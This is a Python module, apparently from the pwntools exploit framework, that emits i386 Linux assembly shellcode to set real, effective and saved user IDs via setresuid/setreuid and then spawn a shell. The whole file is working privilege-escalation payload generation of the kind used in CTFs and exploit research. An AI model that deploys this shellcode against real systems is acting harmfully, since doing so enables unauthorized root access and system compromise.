from pwn.internal.shellcode_helper import *
import ast

from ..io.sh import sh

@shellcode_reqs(arch='i386', os='linux')
def setresuidsh(src = 's', dst = 'res'):
    """Args: [src(imm/reg/r/e/s) = 's'], [dst(r/e/s/combi) = 'res']
    Sets the real, effective and/or saved UID, then spawns a shell.
    The source can be either the a number/register or the real, effective or saved UID.
"""
    return setresuid(src, dst), sh()

@shellcode_reqs(hidden = True, arch='i386', os='linux')
def _zero_optimized_linux(dst):
    res = ['setperms:']

    def p(s):
        res.append(s)

    if 'e' in dst:
        p('xor ecx, ecx')
    else:
        p('push -1')
        p('pop ecx')

    if 'r' in dst:
        p('xor ebx, ebx')
    else:
        if 'e' not in dst:
            p('mov ebx, ecx')
        else:
            p('push -1')
            p('pop ebx')

    if 's' not in dst:
        p('push SYS_setreuid')
        p('pop eax')
    else:
        if 'e' in dst:
            p('imul ecx')
        elif 'r' in dst:
            p('imul ebx')
        else:
            p('xor eax, eax')
            p('cdq')
        p('mov al, SYS_setresuid')

    p('int 0x80')
    return '\n    '.join(res)

@shellcode_reqs(arch='i386', os='linux')
def setresuid(src = 's', dst = 'res'):
    """Args: [src(imm/reg/r/e/s) = 's'], [dst(r/e/s/combi) = 'res']
    Sets the real, effective and/or saved UID.
    The source can be either the a number/register or the real, effective or saved UID.
"""

    return _linux_setresuid(src, dst)

@shellcode_reqs(hidden = True, arch='i386', os='linux')
def _linux_setresuid(src, dst):

    src = arg_fixup(src)

    dst = ''.join(sorted(set(dst)))
    if not all(c in 'res' for c in dst):
        die('Destination for setresuid must be a subset of "res"')

    if src == 0:
        return _zero_optimized_linux(dst)

    lookup = {'r': 'ebx', 'e': 'ecx', 's': 'edx'}

    if 's' in dst:
        syscall = 'SYS_setresuid'
    else:
        syscall = 'SYS_setreuid'
        del lookup['s']

    res = ['setperms:']

    def p(s):
        res.append(s)

    if src == 'r':
        p('push SYS_getuid')
        p('pop eax')
        p('int 0x80')
        p('mov %s, eax' % lookup[dst[0]])
    elif src == 'e':
        p('push SYS_geteuid')
        p('pop eax')
        p('int 0x80')
        p('mov %s, eax' % lookup[dst[0]])
    elif src == 's':
        p('mov ebx, esp')
        p('mov ecx, esp')
        p('push eax')
        p('mov edx, esp')
        p('xor eax, eax')
        p('mov al, SYS_getresuid')
        p('int 0x80')
        p('pop %s' % lookup[dst[0]])
    elif pwn.isint(src) and -128 <= src <= 127:
        p('push %s' % src)
        p('pop %s' % lookup[dst[0]])
    else:
        p('mov %s, %s' % (lookup[dst[0]], src))

    for k in dst[1:]:
        p('mov %s, %s' % (lookup[k], lookup[dst[0]]))

    if 'e' not in dst:
        p('push -1')
        p('pop ecx')

    if 'r' not in dst:
        if 'e' not in dst:
            p('mov ebx, ecx')
        else:
            p('push -1')
            p('pop ebx')

    if syscall == 'SYS_setreuid':
        p('push %s' % syscall)
        p('pop eax')
    else:
        p('xor eax, eax')
        p('mov al, %s' % syscall)
    p('int 0x80')

    return '\n    '.join(res)
